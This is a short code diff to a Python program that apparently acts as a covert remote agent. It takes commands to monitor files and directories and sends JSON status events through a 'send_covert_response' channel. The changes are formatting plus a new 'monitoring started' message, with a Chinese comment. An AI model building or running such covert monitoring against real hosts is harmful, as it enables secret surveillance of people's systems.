@@ -153,10 +153,10 @@ def monitor_file(path):
         last_mtime = os.path.getmtime(path)
     except Exception as e:
         msg = {
-        "type": "MON_FILE_ERROR",
-        "path": path,
-        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()),
-        "content": f"File not accessible: {e}"
+            "type": "MON_FILE_ERROR",
+            "path": path,
+            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()),
+            "content": f"File not accessible: {e}"
         }
         send_covert_response((json.dumps(msg) + "\n").encode())
         return
@@ -587,7 +587,13 @@ def main():
             mon_file_events.clear()
             mon_file_thread = threading.Thread(target=monitor_file, args=(target,), daemon=True)
             mon_file_thread.start()
-            send_covert_response(f"Monitoring file {target}".encode())
+            # 立即发送 JSON 格式的“监控已启动”事件
+            msg0 = {
+                "type": "MON_FILE_STARTED",
+                "path": target,
+                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
+            }
+            send_covert_response((json.dumps(msg0) + "\n").encode())
         elif command_str.startswith("CMD_MON_DIR:"):
             target = command_str.split(":", 1)[1]
             if mon_dir_path:
